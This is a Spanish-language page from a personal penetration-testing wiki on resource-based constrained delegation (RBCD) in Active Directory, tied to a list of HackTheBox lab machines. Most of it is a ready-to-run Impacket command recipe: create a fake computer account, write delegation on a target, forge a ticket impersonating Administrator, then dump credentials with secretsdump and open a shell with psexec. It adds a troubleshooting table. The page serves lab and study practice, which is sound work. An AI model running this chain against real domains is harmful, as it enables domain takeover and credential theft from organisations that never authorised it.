# Técnica: rbcd

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**15 máquina(s)** mencionan esta técnica.

Alias buscados: `resource-based constrained delegation`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<DC_IP>` · `<DOMINIO>` · `<USER>`/`<PASS>` · `<EQUIPO>` (máquina objetivo)

### Por qué RBCD es el camino más accesible

**No requiere privilegios de dominio.** Alcanza con `GenericWrite` o
`GenericAll` sobre una **cuenta de equipo**, más la capacidad de crear (o
controlar) otra cuenta de equipo.

### Paso 0 — ¿puedo crear cuentas de equipo?

```bash
/usr/bin/nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -d <DOMINIO> \
  --query "(objectClass=domain)" "ms-DS-MachineAccountQuota"
```

Por defecto es **10**, o sea que cualquier usuario autenticado puede crear
cuentas de equipo. Si es `0`, necesitás una cuenta de equipo que ya controles.

### Paso 1 — Crear la cuenta de equipo que vas a controlar

```bash
addcomputer.py -computer-name 'FAKE$' -computer-pass 'FakePass123!' \
               -dc-ip <DC_IP> '<DOMINIO>/<USER>':'<PASS>'
```

### Paso 2 — Escribir la RBCD en el objetivo

```bash
# Impacket
rbcd.py -action write -delegate-from 'FAKE$' -delegate-to '<EQUIPO>$' \
        -dc-ip <DC_IP> '<DOMINIO>/<USER>':'<PASS>'

# Ver el estado actual
rbcd.py -action read -delegate-to '<EQUIPO>$' -dc-ip <DC_IP> '<DOMINIO>/<USER>':'<PASS>'

# Deshacer (hacelo al terminar)
rbcd.py -action remove -delegate-from 'FAKE$' -delegate-to '<EQUIPO>$' \
        -dc-ip <DC_IP> '<DOMINIO>/<USER>':'<PASS>'
```

### Paso 3 — S4U2Self + S4U2Proxy para suplantar Administrator

```bash
getST.py -spn cifs/<EQUIPO>.<dominio> -impersonate Administrator \
         -dc-ip <DC_IP> '<DOMINIO>/FAKE$':'FakePass123!'
```

Sin `-impersonate` no hay S4U2Proxy: el tique sería tuyo y no sirve.

### Paso 4 — Usar el tique

```bash
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <EQUIPO>.<dominio>
psexec.py -k -no-pass <EQUIPO>.<dominio>
```

### Errores típicos

| Error | Causa |
|---|---|
| `Could not find the DC` | DNS: agregá el DC a `/etc/hosts` |
| `KDC_ERR_BADOPTION` | `-impersonate` mal, o el SPN no existe |
| `rpc_s_access_denied` en el write | No tenés `GenericWrite` real sobre la cuenta |
| `getST` falla con `KRB_AP_ERR_SKEW` | Reloj: `sudo ntpdate <DC_IP>` |
| `MachineAccountQuota = 0` | Usá una cuenta de equipo existente que controles |

## Referencias

- [[WADComs|WADComs (espejo local)]] — https://wadcoms.github.io/
- [The Hacker Recipes](https://www.thehacker.recipes/)

---

## Máquinas

- [[htb-interactive\|htb-interactive]] — 12 mención(es)
- [[htb-freelancer\|Freelancer]] — 11 mención(es) · Windows · Hard
- [[htb-rebound\|Rebound]] — 7 mención(es) · Windows · Insane
- [[htb-mirage\|Mirage]] — 6 mención(es) · Windows · Hard
- [[htb-phantom\|Phantom]] — 6 mención(es) · Windows · Medium
- [[htb-rustykey\|RustyKey]] — 6 mención(es) · Windows · Hard
- [[htb-pirate\|Pirate]] — 5 mención(es) · Windows · Hard
- [[htb-bruno\|Bruno]] — 4 mención(es) · Windows · Medium
- [[htb-redelegate\|Redelegate]] — 3 mención(es) · Windows · Hard
- [[htb-vintage\|Vintage]] — 3 mención(es) · Windows · Hard
- [[htb-mist\|Mist]] — 2 mención(es) · Windows · Insane
- [[htb-university\|University]] — 2 mención(es) · Windows · Insane
- [[htb-authority\|Authority]] — 1 mención(es) · Windows · Medium
- [[htb-darkzero\|DarkZero]] — 1 mención(es) · Windows · Hard
- [[htb-support\|Support]] — 1 mención(es) · Windows · Easy

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'rbcd' -v
python3 _sistema/herramientas/buscar.py 'rbcd' -v --oscp
```
